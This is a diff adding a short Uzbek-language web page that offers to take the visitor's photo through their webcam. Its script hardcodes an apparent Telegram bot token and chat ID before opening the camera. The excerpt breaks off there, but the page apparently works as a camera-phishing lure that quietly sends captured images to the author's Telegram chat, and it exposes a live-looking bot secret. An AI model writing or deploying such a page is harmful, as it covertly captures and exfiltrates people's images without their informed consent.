@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Rasmga tushish</title>
+</head>
+<body style="text-align:center; font-family:sans-serif; padding-top:30px;">
+
+  <h2>📸 Rasmga tushmoqchimisiz?</h2>
+  <video id="video" width="300" autoplay></video><br><br>
+  <button id="btn">📷 Rasmga olish</button>
+  <canvas id="canvas" style="display:none;"></canvas>
+  <p id="msg" style="color:green;"></p>
+
+  <script>
+    const token = '7800431576:AAEZIBYWvXHxUDsE69aAvCuz4UfklksloZI'; // TOKEN
+    const chatId = '1294647077'; // CHAT ID
+
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+    const msg = document.getElementById('msg');
+
+    // Kamera ochish
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => video.srcObject = stream)
+      .c
